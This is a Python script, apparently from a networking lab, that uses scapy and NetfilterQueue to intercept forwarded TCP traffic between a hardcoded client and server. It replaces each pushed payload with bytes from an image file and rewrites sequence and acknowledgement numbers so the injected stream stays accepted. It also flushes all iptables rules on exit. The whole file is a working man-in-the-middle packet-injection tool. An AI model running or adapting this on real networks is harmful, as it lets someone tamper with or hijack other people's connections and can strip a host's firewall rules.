from scapy.all import *
from netfilterqueue import NetfilterQueue as NFQ
import os

from scapy.layers.inet import IP, TCP

#
# def detect_and_alter_packet(packet : Packet):
#     """Functie care se apeleaza pentru fiecare pachet din coada
#     """
#     octets = packet.get_payload()
#     scapy_packet = IP(octets)
#     print("[Before]:")
#     print(scapy_packet.show())
#     if scapy_packet.haslayer(IP) and scapy_packet.haslayer(TCP) and scapy_packet.haslayer(Raw) and scapy_packet[TCP].flags == "PA" and scapy_packet[Raw].load:
#         # if (scapy_packet[IP].src == "198.10.0.2" and scapy_packet[IP].dst == "172.10.0.2") or (scapy_packet[IP].src == "198.10.0.2" and scapy_packet[IP].dst == "198.10.0.1"):  # server->client
#         #     scapy_packet = alter_packet_server_to_client(scapy_packet)
#         if (scapy_packet[IP].src == "172.10.0.2" and scapy_packet[IP].dst == "198.10.0.2") or (scapy_packet[IP].src == "198.10.0.1" and scapy_packet[IP].dst == "198.10.0.2"):
#             scapy_packet = alter_packet_client_to_server(scapy_packet)
#         else:
#             scapy_packet = alter_packet(scapy_packet)
#         print("[After ]:")
#         print(scapy_packet.show())
#         octets = bytes(scapy_packet)
#         packet.set_payload(octets)
#     packet.accept()
#
#
#
# def alter_packet_client_to_server(scapy_packet):
#     """
#     client->server => vom adauga mesajul si lasam ack si seq asa cum sunt
#     """
#     new_load = fin.read(1000)
#     scapy_packet[TCP].payload = Raw(new_load) # Raw(bytes(scapy_packet[TCP].payload) + new_load)
#     del scapy_packet[IP].len
#     del scapy_packet[IP].chksum
#     del scapy_packet[TCP].chksum
#     return scapy_packet
#
#
# def alter_packet(scapy_packet):
#     """
#     doar recalculam checksum
#     """
#     del scapy_packet[IP].len
#     del scapy_packet[IP].chksum
#     del scapy_packet[TCP].chksum
#     return scapy_packet
# frag-urile TCP
FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80

hacked_seq = dict()
hacked_ack = dict()

client_ip = "172.10.0.2"
server_ip = "198.10.0.2"
fin = open("elocal/poza_router.png", 'rb')

def detect_and_alter_packet_v2(packet: Packet):
    global client_ip
    global server_ip
    global hacked_seq
    global hacked_ack

    octets = packet.get_payload()
    scapy_packet = IP(octets)

    if scapy_packet.haslayer(TCP) and (scapy_packet[IP].src == client_ip or scapy_packet[IP].src == server_ip):
        F = scapy_packet['TCP'].flags
        old_seq = scapy_packet['TCP'].seq
        old_ack = scapy_packet['TCP'].ack
        new_seq = hacked_seq[old_seq] if old_seq in hacked_seq.keys() else old_seq
        new_ack = hacked_ack[old_ack] if old_ack in hacked_ack.keys() else old_ack

        print("[Before]:")
        print(scapy_packet[IP].show2())

        msg = scapy_packet['TCP'].payload

        if F & PSH:
            poza = fin.read(len(msg))
            # msg = scapy.packet.Raw(b'Hacked ' + bytes(scapy_packet[TCP].payload))
            msg = scapy.packet.Raw(poza)
        hacked_seq[old_seq + len(scapy_packet['TCP'].payload)] = new_seq + len(msg)
        hacked_ack[new_seq + len(msg)] = old_seq + len(scapy_packet['TCP'].payload)

        new_packet = IP(
            src=scapy_packet[IP].src,
            dst=scapy_packet[IP].dst
        ) / TCP(
            sport=scapy_packet[TCP].sport,
            dport=scapy_packet[TCP].dport,
            seq=new_seq,
            ack=new_ack,
            flags=scapy_packet[TCP].flags
        ) / (msg)

        print("[After]:")
        print(new_packet[IP].show2())

        send(new_packet)
    else:
        print("ignore")
        send(scapy_packet)



if __name__ == "__main__":
    """
    instantiem un netfilterqueue si redirectionam pachetele prin aceasta, apoi facem bind (pt fiecare pachet, se va apela detect_and_alter_packet)
    """
    queue = NFQ()
    try:
        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 10")
        queue.bind(10, detect_and_alter_packet_v2)
        queue.run()
    except KeyboardInterrupt:
        os.system("iptables --flush")
        queue.unbind()
